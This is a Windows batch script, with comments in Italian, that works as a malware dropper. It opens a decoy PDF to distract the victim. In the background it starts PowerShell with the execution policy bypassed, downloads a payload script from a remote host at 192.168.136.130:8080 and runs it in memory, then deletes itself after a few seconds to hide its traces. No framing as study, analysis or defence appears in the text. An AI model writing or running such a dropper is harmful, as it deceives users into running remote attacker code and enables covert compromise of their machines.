@echo off
REM === Apri il PDF fasullo ===
start "" "%~dp0..\lorenza.pdf"

REM === Scarica ed esegui payload IN BACKGROUND ===
start /B powershell -NoP -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.136.130:8080/payload0.ps1')"

REM === Auto-eliminazione DOPO 5 secondi ===
ping -n 5 127.0.0.1 >nul
del "%~f0" >nul 2>&1